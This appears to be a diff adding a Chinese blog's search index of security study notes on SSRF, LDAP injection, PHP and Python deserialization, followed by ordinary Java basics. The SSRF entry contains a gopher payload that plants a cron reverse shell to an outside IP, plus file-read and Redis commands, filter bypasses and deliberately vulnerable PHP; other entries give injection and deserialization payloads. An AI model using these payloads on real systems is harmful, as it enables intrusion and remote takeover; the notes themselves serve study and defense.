+        <tag>XML注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SSRF漏洞攻击与防御]]></title>
+    <url>%2F2018%2F05%2F30%2FSSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
+    <content type="text"><![CDATA[0x01 概述SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。 0x02 SSRF的危害 扫内网 向内部任意主机的任意端口发送精心构造的Payload DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等） 利用file协议读取本地文件等 0x03 漏洞利用CURL支持协议 本地利用 123456789# dict protocol (操作Redis)curl -vvv &apos;dict://127.0.0.1:6379/info&apos;# file protocol (任意文件读取)curl -vvv &apos;file:///etc/passwd&apos;# gopher protocol (一键反弹Bash)# * 注意: 链接使用单引号，避免$变量问题curl -vvv &apos;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos; 远程利用 漏洞代码testssrf.php（未作任何SSRF防御）1234567891011&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); &#125;$url = $_GET[&apos;url&apos;];curl($url);?&gt; 利用file协议读取文件 利用dict协议查看端口开放当端口开放的时候 当端口未开放的时候 回显 利用gopher协议反弹shell 待更新。。。 漏洞代码testssrf2.php限制了只能使用HTTP,HTTPS，设置跳转重定向为True（默认不跳转）12345678910111213141516&lt;?php function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);//限制为HTTP,HTTPS curl_setopt($ch,CURLOPT_PROTOCOLS,CURLPROTO_HTTP|CURLPROTO_HTTPS); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($url); curl_close();&#125;$url = $_GET[&apos;url&apos;];curl($url); ?&gt; 此时用file、dict等协议就没有用了。此时可以利用302跳转进行利用1234567891011&lt;?php$schema = $_GET[&apos;s&apos;];$ip = $_GET[&apos;i&apos;];$port = $_GET[&apos;p&apos;];$query = $_GET[&apos;q&apos;];if(empty($port))&#123; header(&quot;Location: $schema://$ip/$query&quot;);&#125;else&#123; header(&quot;Location: $schema://$ip:$port/$query&quot;);&#125;?&gt; 0x04 漏洞代码curl造成的SSRF12345678910function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;$url = $_GET[&apos;url&apos;];curl($url); file_get_contents造成的SSRF12$url = $_GET[&apos;url&apos;];echo file_get_contents($url); fsockopen造成的SSRF12345678910111213141516171819&lt;?phpfunction Getfile($host, $port, $link)&#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if(!$fp)&#123; echo &quot;$errstr (error number $errno) \n&quot;; &#125;else&#123; $out = &quot;GET $link HTTP/1.1\r\n&quot;; $out .= &quot;HOST $host \r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; $out .= &quot;\r\n&quot;; fwrite($fp, $out); $content = &apos;&apos;; while(!feof($fp))&#123; $contents .= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125;&#125; 0x05 常见的过滤与绕过常见的过滤 过滤开头不是http://xxx.com的所有链接 过滤格式为ip的链接，比如127.0.0.1 结尾必须是某个后缀 绕过方法 http基础认证http://xxx.com@attacker.com 利用302跳转（xip.io，www.tinyrul.com）2.1 当我们访问xip.io的子域，比如127.0.0.1.xip.io的时候，实际上会被自动重定向到127.0.0.12.2 如果利用上面的方法会被检测127.0.0.1的话，可以利用www.tinyurl.com提供的服务来进行绕过 加上#或?即可 4.更改其他进制的ip 0x06 修复方案修复方案： • 限制协议为HTTP、HTTPS • 不用限制302重定向 • 设置URL白名单或者限制内网IP]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[LDAP注入漏洞与防御]]></title>
+    <url>%2F2018%2F05%2F30%2FLDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
+    <content type="text"><![CDATA[0x01 前言前两天爆了一个LDAP漏洞，据说存在了8年现在才被发现，感概一下，不知这8年来有多少站被搞了。。。想着复现这个漏洞，就先复习一下LDAP注入的相关知识吧，差了很多资料，记一下笔记。 0x02 LDAP介绍在学习LDAP注入之前，首先要了解LDAP的运行机制。什么是LDAP？LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。简单来说，可以理解为LDAP是某种搜索协议，就像我们熟知的数据库一样，我们利用SQL语句进行查询数据库中的数据。而LDAP也有一套自己的查询语句，来进行查询。 LDAP查询语法12search语法：attribute operator valuesearch filter options:( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter)) LDAP的搜索语法其实很容易，这里看不明白的话，往下看一下具体实例就会明白的。 0x03 LDAP注入攻击轻量级目录访问协议是通过TCP/IP查询和修改目录服务的协议，使用最广泛的LDAP服务如微软的ADAM(Active Directory Application Mode)和OpenLDAP。 1(&amp;(attribute=value)(injected_filter)) (second_filter) 需要注意的是，在OpenLDAP中，第二个过滤器会被忽略，只有第一个会被执行，那么类似上面的这种注入就可以成功的。而在ADAM中，有两个过滤器的查询是不被允许的，那么这种注入是没什么用的。 AND LDAP注入 当后端的代码如下1(&amp;(parameter1=value1)(parameter2=value2)) 这里value1和value2都会被查询，其中value1和value2是用户可控的，如果过滤不完善，就会存在LDAP注入的可能。比如一个用户登录的场景，用户输入username和password，应用会构造一个过滤器并发给LDAP服务器进行查询。1(&amp;(username=uname)(password=pwd)) 当用户输入一个有效的用户名，例如admin，那么就有可能在username字段后面进行注入，从而在不知道密码的情况下进行登陆。12payload: admin)(&amp;))result: (&amp;(username=admin)(&amp;))(password=123)) LDAP服务器只会处理第一个过滤器，而第一个过滤器永真，因此绕过了登录框 OR LDAP注入 当后端代码如下：1(|(parameter1=value1)(parameter2=value2)) 一个典型的OR LDAP注入的场景就是：假设一个资源管理器允许用户了解系统中可用的资源(打印机、扫描器、存储系统等)。用于展示可用资源的查询为：1(|(type=Rsc1)(type=Rsc2)) Rsc1和Rsc2表示系统中不同种类的资源，例如，Rsc1=printer，Rsc2=scanner用于列出系统中所以可用的打印机和扫描器。12payload: Rsc1=printer)(uid=*)result: (|(type=printer)(uid=*))(type=scanner)) LDAP服务器会响应所有的打印机和用户对象 LDAP盲注- LDAP AND盲注 假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：1(&amp;(objectclass=printer)(type=Epson*)) 使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击”)(objectClass=))(&amp;(objectClass=void”，Web应用会构造如下查询：1(&amp;(objectclass=*)(objectClass=*))(&amp;(objectClass=void)(type=Epson*)) 仅对第一个过滤器进行处理：1(&amp;(objectclass=*)(objectClass=*)) 结果是，打印机的图标会一定显示出来，因为该查询永远会有结果，过滤器objectClass=*总是返回一个对象。当图标被显示时响应为真，否则为假。例如构造如下的注入：123(&amp;(objectClass=*)(objectClass=users))(&amp;(objectClass=foo)(type=Epson*))(&amp;(objectClass=*)(objectClass=resources))(&amp;(objectClass=foo)(type=Epson*)) 这种代码注入的设置允许攻击者推测可能存在于LDAP目录服务中不同对象类的值。当响应Web页面至少包含一个打印机图标时，对象类的值就是存在的，另一方面而言，如果对象类的值不存在或没有对它的访问，就不会有图标出现。 - LDAP OR盲注 这种情况下，用于推测想要的信息的逻辑是相反的，因为使用的是OR逻辑操作符。接下来使用的是同一个例子，OR环境的注入为：1(|(objectClass=void)(objectClass=void))(&amp;(objectClass=void)(type=Epson*)) 这个LDAP查询没有从LDAP目录服务获得任何对象，打印机的图标也不会显示给客户端(FALSE)。如果在响应的Web页面中有任何图标，则响应为TRUE。故攻击者可以注入下列LDAP过滤器来收集信息：12(|(objectClass=void)(objectClass=users))(&amp;(objectClass=void)(type=Epson*))(|(objectClass=void)(objectClass=resources))(&amp;(objectClass=void)(type=Epson*)) ##0x04 LDAP注入防御 LDAP注入的防御跟SQL注入的防御其实差不多，主要就是要把用户输入的东西过滤好，基本就可以防御了。下图包含了LDAP中用到的特殊字符和需要转义处理的字符： 左边的字符在正常情况下是不会用到的，如果在用户的输入中出现了需要用反斜杠转义处理。而右边的圆括号这些如果不过滤的话就会导致过滤器闭合而生产攻击者需要的filter，这里看到不仅是用反斜杠处理，还将字符变成了相应的ASCII码值，这些符号本不该出现。 这段php防御代码可以记录一下：123456789function ldapspecialchars($string) &#123; $sanitized=array(&apos;\\&apos; =&gt; &apos;\5c&apos;, &apos;*&apos; =&gt; &apos;\2a&apos;, &apos;(&apos; =&gt; &apos;\28&apos;, &apos;)&apos; =&gt; &apos;\29&apos;, &quot;\x00&quot; =&gt; &apos;\00&apos;); return str_replace(array_keys($sanitized),array_values($sanitized),$string);&#125; LDAP服务开启的端口是389，如果发现某个服务器上开启了该端口很可能就是开启了LDAP服务 0x05 参考文献http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>LDAP注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[PHP反序列化漏洞与防御]]></title>
+    <url>%2F2018%2F05%2F30%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
+    <content type="text"><![CDATA[0x01 概述什么是php反序列化漏洞呢？简单的来说，就是在php反序列化的时候，反序列化的内容是用户可控，那么恶意用户就可以构造特定序列化内容的代码，通过unserialize()函数进行特定的反序列化操作，并且程序的某处存在一些敏感操作是写在类中的，那么就可以通过这段恶意代码，达到执行攻击者想要的操作。在了解php反序列化漏洞之前，需要了解一下php序列化和反序列化的相关知识。 0x02 PHP序列化与反序列化123456789101112&lt;?phpclass Test&#123; public $var = &quot;This is a test&quot;; public function PrintVar()&#123; echo this -&gt; $var; &#125;&#125;$obj = new Test();$obj-&gt;PrintVar();?&gt; 运行后 magic 函数 php面向对象变成中，有一类函数叫做magic function，魔术函数，这些函数是以(双下划线)开头的，他们是一些当依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，这里说一下比较常见的例如construct，destory， sleep，wakeup，toString函数。 __construct() __contstruct()函数被称为构造函数，当实例化类的时候会自动调用该函数 __destruct() __destruct()函数被称为析构函数，当类结束的时候自动调用该函数 __sleep() __sleep()函数是当php进行序列化操作（serialize）的时候自动调用该函数，可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 __wakeup() __wakeup()函数是当php进行反序列化操作（unserialize）的时候自动调用该函数 __toString() __toString()函数是当对象被当做字符串的时候会自动调用该函数 例如： 运行后结果： 私有成员与被保护成员变量的特殊性当类中的成员变量是私有的或者被保护的，那么会产生一些特殊的情况 运行结果： 我们可以看到，在序列化后得到的序列化代码中，私有成员变量name前加了一个User，被保护变量成员age的前面加了一个，并且明明Username长度为8，但是却显示的是10；同样，明明age的长度为4，但却显示的是6。查阅php手册发现，当成员变量是私有的时候，会在成员变量前面添加类名；当成员变量是被保护的时候，会在被保护成员前面添加一个，并且，所添加的类名或者的左右两边都会有一个null字节，因此，这两个长度都增加了2。 ##0x03 PHP反序列化漏洞 wakeup()或destruct()的利用场景 假设服务器的代码如下：123456789101112131415161718&lt;?php class Test&#123; var $test = &quot;123&quot;; function __wakeup()&#123; $fp = fopen(&quot;test.php&quot;, &apos;w&apos;); fwrite($fp, $this -&gt; test); fclose($fp); &#125;&#125;$test1 = $_GET[&apos;test&apos;];print_r($test1);echo &quot;&lt;br /&gt;&quot;;$seri = unserialize($test1);require &quot;test.php&quot;;?&gt; 我们可以在本地搭建环境，编写exp之后用serialize函数进行序列化，得到payload，如：1O:4:&quot;Test&quot;:1:&#123;s:4:&quot;test&quot;;s:18:&quot;&lt;?php%20phpinfo();?&gt;&quot;;&#125; 其他Magic Function情况 当unserialize的时候不是直接在wakup魔术方法中利用，比如在construct之类的，也是有利用价值的。譬如，当wakup中又调用了别的对象，那么我们就可以进行回溯去找，也许也可以利用到。例如：123456789101112131415161718192021&lt;?php class Test1&#123; function __construct($test)&#123; $fp = fopen(&quot;shell.php&quot;, &quot;w&quot;); fwrite($fp, $test); fclose($fp); &#125;&#125;class Test2&#123; var $test = &quot;123&quot;; function __wakeup()&#123; $obj = new Test1($this -&gt; test); &#125;&#125;$test = $_GET[&apos;test&apos;];unserialize($test);require &quot;shell.php&quot;;?&gt; 普通情况 当危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时可以寻找相同的函数名，把敏感函数和类联系在一起。12345678910111213141516171819202122232425262728&lt;?php class Test1&#123; var $test1; function __construct()&#123; $this-&gt;test1 = new Test2(); &#125; function __destruct()&#123; $this-&gt;test1-&gt;action(); &#125;&#125;class Test2&#123; function action()&#123; echo &quot;Test2&quot;; &#125;&#125;class Test3&#123; var $test3; function action()&#123; eval($this-&gt;test3); &#125;&#125;$test = new Test1();unserialize($_GET[&apos;test&apos;]);?&gt; 这里我们可以利用Test3中的action函数中的eval函数做一些事情。12345678910111213141516class Test1&#123; var $test1; function __construct()&#123; $this-&gt;test1 = new Test3(); &#125; function __destruct()&#123; $this-&gt;test1-&gt;action(); &#125;&#125;class Test3&#123; var $test3 = &quot;phpinfo();&quot;;&#125;echo serialize(new Test1()); 得到 O:5:”Test1”:1:{s:5:”test1”;O:5:”Test3”:1:{s:5:”test3”;s:10:”phpinfo();”;}} ##0x04 参考文献 https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Python反序列化之pickle篇]]></title>
+    <url>%2F2018%2F05%2F30%2FPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpickle%E7%AF%87%2F</url>
+    <content type="text"><![CDATA[0x01 前言前两天在安全客中看了一篇python对象注入的文章，感觉写的很好，就学习一下，在此记录一下。 0x02 Python之pickle在研究python反序列化漏洞之前，我们需要了解本次研究的主体：pickle模块这里主要需要知道4个方法：dump()dumps()load()loads() pickle.dump(obj, file, [protocol])dump()会将对象序列化后写入一个文件中，其中，文件需要有write接口，protocol代表的是协议，当protocol=0的时候表示序列化对象用可表示的ascii码写，当protocol=1的时候代表用二进制表示，那么文件就要用wb模式打开，当protocol=2的时候也是用二进制表示，在python2.3之后的版本可以使用，会更高效一些，默认protocol=0。 pickle.dumps(obj)与dump()不同的是，dumps()只是将序列化对象当作字符串返回 pickle.load(file)load()会读入file的内容，并将其反序列化为对象，file的内容要求是序列化的内容。 pickle.loads(pick_data)loads()会将序列化的字符串反序列化为对象 cPickle与pickle的用法差不多，但是cPickle使用C语言写的，别pickle更高效，现在大部分都会使用cPickle来代替pickle了。 0x03 Python对象注入之pickle什么是对象注入？回想一下之前讲PHP反序列化漏洞的时候的概念，其实差不多，在pickle中，序列化的过程是没有问题的，但是当反序列化的过程中，如果用户的输入被传入unpickling中时，那么就有可能存在对象注入的风险。 举个例子：12345678910111213141516171819202122232425import cPickle as pickleimport os, sysarg = sys.argv[1]class Test(object): def load(self, filenmae=None): with open(filenmae, &apos;rb&apos;) as pick_file: self.doWork = pickle.load(pick_file) self.workDone = self.doWork def final_workout(self, unpickled_data): self.filename = &quot;code.py&quot; self.writeinto = open(self.filename, &quot;w&quot;) self.writeinto.write(unpickled_data) print &quot;Flag = 1&quot; self.writeinto.close() os.system(&quot;python2 &#123;&#125;&quot;.format(str(self.filename)))if __name__ == &apos;__main__&apos;: test = Test() test.load(arg) unpickled_data = test.workDone test.final_workout(unpickled_data) 这段代码中，首先他有一个接受用户输入的功能，并且反序列化了用户的输入，并放入一个叫做code.py脚本中执行，那么我们就可以构造特定的字符串来执行我们想要的功能。 0x04 漏洞利用编写exp.py1234567891011121314151617181920212223242526272829303132333435import cPickle as picklefilename = &quot;pickle_data2.txt&quot;code = &quot;code.txt&quot;class Test(object): def load(self, code): self.code = code self.readin = open(code, &quot;r&quot;) self.readin_data = self.readin.read() self.done = pickle.dumps(self.readin_data) def write_into(self, filename, pickle_data): self.writeinto =open(filename, &quot;w&quot;) self.writeinto.write(pickle_data) print &quot;Writing pickle data into the file...&quot; self.writeinto.close() def read_into(self, filenmae): self.filename = filename self.readinto = open(filename, &quot;r&quot;) self.ret_data = self.readinto.read() print &quot;\n\n&quot; print &quot;Pickle data: \n\n&quot; print self.readin_dataif __name__ == &apos;__main__&apos;: test = Test() test.load(code) pickle_data = test.done test.write_into(filename, pickle_data) test.read_into(filename)]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+        <tag>Web安全</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java中的接口]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E6%8E%A5%E5%8F%A3%2F</url>
+    <content type="text"><![CDATA[0x01 接口在Java中，接口表示一种规范，要求实现者必须遵循这个规范，用来约束使用者该怎么做必须要求实现者提供具体的实现方法接口就是一个特殊的抽象类就算不实用abstract关键字，他在编译的时候也会自动在class文件中，在方法名前面加上public abstract 0x02 接口的特点 接口是没有构造器的，接口是不能创建对象 接口当中定义变量，会被当作是全局静态常量String name = “pino”; ====&gt;&gt;&gt; public static final String name = “pino”; 接口中定义的方法，都是公共的抽象方法 接口是可以继承的，并且是多继承，都好分割，但是类不能多继承 接口一般可以称为父类 接口也可以多实现，逗号分隔 实现接口的时候，子类要比接口中的类的方法权限大（一般都是public） 面向接口编程（赋值的时候，可以直接赋值给接口类型，多态的概念） 0x03 接口与抽象类的区别？ 相同： 都是被其他类实现或继承 都不能被实例化 都可以定义抽象方法，定义的抽象方法都必须得要覆盖 不同点： 接口是没有构造器的，抽象类是有的 抽象类可以包含普通方法，但是接口当中只能有抽象方法，不能有普通方法 接口默认的成员变量是public static final变量，抽象类当中是默认权限 接口当中的默认方法是public abstract 方法名 0x04 面向接口编程把实现类赋值给接口类型的变量 为什么使用？多态的好处：屏蔽了不同类之间的差异，从而实现通用编程]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java中的抽象]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E6%8A%BD%E8%B1%A1%2F</url>
+    <content type="text"><![CDATA[0x01 抽象方法 特点 没有方法体 抽象方法必须定义在抽象类或接口 不能是私有的，不能使用final，不能使用static 子类必须要覆盖此方法 0x02 抽象类抽象类必须得要有子类才行（抽象类一般都当作父类来继承） 抽象类是不能直接创建对象的 抽象类当中可以有抽象方法，也可以有普通方法（普通方法：给子类调用的） 子类没有覆盖抽象方法，把子类也变成抽象类，然后创建一个子孙类，让子孙类去覆盖 抽象类的构造方法不能定义为私有的（抽象方法必须得让子类继承之后，才能实现内部的方法体，因为子类如果继承的话，先去调用父类的构造方法） 抽象类不能使用final来修饰 抽象类不是一个完整的类，需要作为一个父类，子类才能完成对应的功能。抽象类命名时，喜欢在前面添加一个Abstract单词 抽象类与普通类的区别？ 普通类有的（字段，方法，构造器），抽象类都有 抽象类不能创建对象，抽象类可以包含抽象方法，也可以包含普通方法 抽象类必须有子类才有意义]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java当中的包装类、装箱和拆箱]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E5%BD%93%E4%B8%AD%E7%9A%84%E5%8C%85%E8%A3%85%E7%B1%BB%E3%80%81%E8%A3%85%E7%AE%B1%E5%92%8C%E6%8B%86%E7%AE%B1%2F</url>
+    <content type="text"><![CDATA[0x01 包装类对基本数据类型进行包装，把基本数据类型包装一个对象，从而获取更加强大的功能 基本数据类型 包装类 byte Byte short Short int Integer（内部覆盖到了toString方法，所以打印出来的不是地址而是具体的值） long Long float Float double Double char Character boolean Boolean 0x02 装箱操作12Integer num1 = new Integer(10); //方法一Integer num2 = Integer.valueOf(10);//方法二 在类中，成员变量一般使用包装类，在方法中一般使用基本数据类型。方法中，基本数据类型存储来栈中，而包装类存储在堆中。 0x03 拆箱操作把包装类转回基本数据类型 12Integer num = new Integer(10); //装箱int num2 = num.intValue(); //拆箱 类似的还有doubleValue()、longValue()等等 0x04 自动装箱与自动拆箱 自动装箱可以直接把一个基本数据类型的值赋值给包装类对象 1Integer num = 20; 自动拆箱可以直接把一个包装类对象赋值给基本数据类型的变量 1int num = Integer.valueOf(10); 0x05 包装类valueOf的缓存设计以Integer为例子，如果数值在-128到127之间（不同的包装类数值不同），会使用缓存机制，直接从之前创建的地方获取，超出这个范围则不实用缓存，直接创建新的地址。]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java中的类加载和初始化问题]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E9%97%AE%E9%A2%98%2F</url>
+    <content type="text"><![CDATA[0x01 类加载问题什么时候加载类？ 当第一次使用该类对象的时候，去加载到JVM当中，并且只加载一次，下一次使用，直接从内存当中拿，在加载的时候会执行static 0x02 字段初始化问题 静态字段初始化，是在静态代码块当中执行 非静态字段初始化，是在构造器当中做的初始化 子类构造器会默认调用父类构造器]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java中的代码块]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E5%9D%97%2F</url>
+    <content type="text"><![CDATA[0x01 代码块在类中或方法中，使用{}花括号括起来的代码 分类 局部代码块 直接定义在方法内部中 初始化代码块 直接在类中定义代码块 初始化代码块在运行时还要把它放到构造方法当中 创建一个对象就会调用一次 静态代码块 在初始化代码块前加static，在加载成字节码时就会调用，也就是说在主方法前执行，并且只会执行一次]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java中的多态]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E5%A4%9A%E6%80%81%2F</url>
+    <content type="text"><![CDATA[0x01 多态一个类对象有各种形态，比如狗是狗类，也是动物类，一个表示当前类，一个表示其父类 0x02 多态的特点 子类对象赋值给父类，运行时，表现的是子类的特征（先去找子类的方法） 字段不存在多态，字段前面是什么类型就调用谁的，在编译的时候已经确定要去调用谁的 怎么理解呢，看下面的代码 运行的时候发现结果是Super，不是说调用子类的特征吗？为什么不是Sub？答案就是刚才说的那样，在编译的时候已经决定了使用字段的类型。 0x03 多态的作用 当把不同子类对象都当作父类来看待，可以屏蔽不通过子类对象之间的差异性，从而达到通用编程的目的 使用多态后，只需要写一个方法就能达到相同的功能 0x04 类的强制类型转换把父类赋值给子类，在概念上与多态相反。]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java中的继承]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E7%BB%A7%E6%89%BF%2F</url>
+    <content type="text"><![CDATA[0x01 子类可以使用父类的哪些成员 父类的public，子类可以继承 protected也可以继承，不同包也能继承 如果子类与父类在同一个包中，子类可以继承父类的默认成员，但是不能继承不同包中的父类的默认成员 private是不能继承的 父类的构造器，子类也不能继承，因为构造器必须跟当前类名相同 0x02 方法的覆盖子类扩展了父类，就获得了父类的方法和成员，如果父类有些方法不适用于子类，可以重新定义这个方法，叫做方法的覆盖。 覆盖的原则 覆盖的方法必须跟父类当中的方法名相同 返回类型要相同 访问权限不能比父类小 0x03 继承的内存分析在类加载字节码时，会先判断有没有父类，如果有，会先把父类加载成字节码放到内存中，然后再把自己加载到内存中 0x04 this和super的对比 super()和this()构造方法都必须放在第一行 super和this不能同时一起使用 子类的构造方法中默认都有一个super()，尽管没有显示出来。 0x05 隐藏 子类跟父类有相同的变量名，叫做隐藏，子类通过”super.字段”来访问父类的成员 子类跟父类当中有相同的静态方法，称方法的隐藏 本垒字段隐藏：方法参数和本类字段名相同，使用”this.字段”来解决]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java中的this关键字]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84this%E5%85%B3%E9%94%AE%E5%AD%97%2F</url>
+    <content type="text"><![CDATA[0x01 This关键字在方法中加入this，代表直接给对象当中的字段赋值。 this是当前正在使用的对象的地址 this的作用： 帮助我们区分成员变量和局部变量的二异性 在同类当中，实例方法的调用，前面其实是有this的，只不过给省略了 可以把this作为返回值返回 可以当作返回值 static和this不能同时使用 构造器的重载互调，this()；此时this代表的是构造器名，必须写到第一行。]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java中的变量划分]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E5%88%92%E5%88%86%2F</url>
+    <content type="text"><![CDATA[0x01 变量的划分 成员变量 直接定义在类中的变量 类成员变量：在成员变量前面加static 实例变量：没加static就是实例成员变量注意：在方法中不能定义static 局部变量 定义在方法当中的变量（参数，内部定的变量，代码块）必须要初始化之后使用 0x02 总结 类成员和实例成员的访问 在static方法中，只能调用static成员 非static方法中，可以访问静态成员也可以访问非静态成员 可以通过对象去调用静态成员（本质还是通过类名调用） 变量名称 存放位置 生命周期开始 声明周期结束 内存位置 类变量 字段，使用static 所在字节码加载到JVM 当JVM停止时 方法区 实例变量 字段，不使用static 创建所在类的对象 对象被回收的时候 堆 局部变量 方法参数，代码块，方法区 执行到初始化变量时 所在方法或代码块执行结束 栈]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java基本数据类型与引用数据类型]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%95%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
+    <content type="text"><![CDATA[0x01 基本数据类型首先，了解一下基本数据类型有哪些 基本数据类型 备注 byte 8位 short 16位 char 16位 int 32位 float 32位 double 64位 long 64位 boolean 1位，只有true和false 基本数据类型只有一块存储空间，在栈中，存放的是具体的值 基本数据类型属于值传递（传递的是一个具体的值） 0x02 引用数据类型什么是引用数据类型？类接口数据枚举注解也就是说，使用new关键字创建出来的乐境都是引用数据类型 引用数据类型有两块存储空间，一个在栈中，一个在堆中，栈中存放的是堆中的地址。 引用数据类型属于地址传递（传递的是一个地址） 0x03 基本数据类型在堆中的初始化栈桢中的数据必须进行初始化，否则不能使用，但是堆中的数据可以不初始化就使用，因为有默认值。 数据类型 默认值 byte 0 short 0 int 0 long 0 float 0.0f double 0.0d char ‘/u0000’ boolean false String String虽然不是基本数据类型，但是也是有默认值的，是null]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[JAVA内存了解一下]]></title>
+    <url>%2F2018%2F05%2F30%2FJAVA%E5%86%85%E5%AD%98%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%2F</url>
